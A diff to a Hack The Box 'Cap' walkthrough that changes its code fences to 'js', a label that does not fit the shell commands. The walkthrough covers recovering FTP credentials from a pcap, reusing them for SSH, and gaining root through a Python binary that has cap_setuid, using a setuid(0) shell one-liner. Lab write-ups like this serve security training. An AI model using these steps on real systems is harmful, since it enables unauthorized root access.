@@ -10,7 +10,7 @@ title: HTB - Cap
 
 ## Enumeration
 
-```
+```js
 rustscan -a 10.129.40.90 -- -sC -sV -oN cap-nmap.txt
 ```
 
@@ -48,7 +48,7 @@ This returned a different capture that I could download. The application accepte
 
 ## Packet capture analysis
 
-```
+```js
 wireshark 0.pcap
 ```
 
@@ -60,13 +60,13 @@ The FTP protocol sends commands and credentials in plaintext. The capture includ
 
 ## SSH access
 
-```
+```js
 ssh nathan@10.129.40.90
 ```
 
 The credentials recovered from the FTP capture also worked for SSH. After logging in as `nathan`, I read the user flag:
 
-```
+```js
 cat user.txt
 ```
 
@@ -76,7 +76,7 @@ This showed that credentials exposed through one service can sometimes be reused
 
 ## Privilege escalation
 
-```
+```js
 getcap -r / 2>/dev/null
 ```
 
@@ -88,13 +88,13 @@ The important result was:
 
 `cap_setuid` allows the Python process to change its user ID. Assigning this capability to a general-purpose interpreter is dangerous because it can be used to execute code as another user, including root.
 
-```
+```js
 python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 ```
 
 I verified root access and read the root flag:
 
-```
+```js
 id
 cat /root/root.txt
 ```
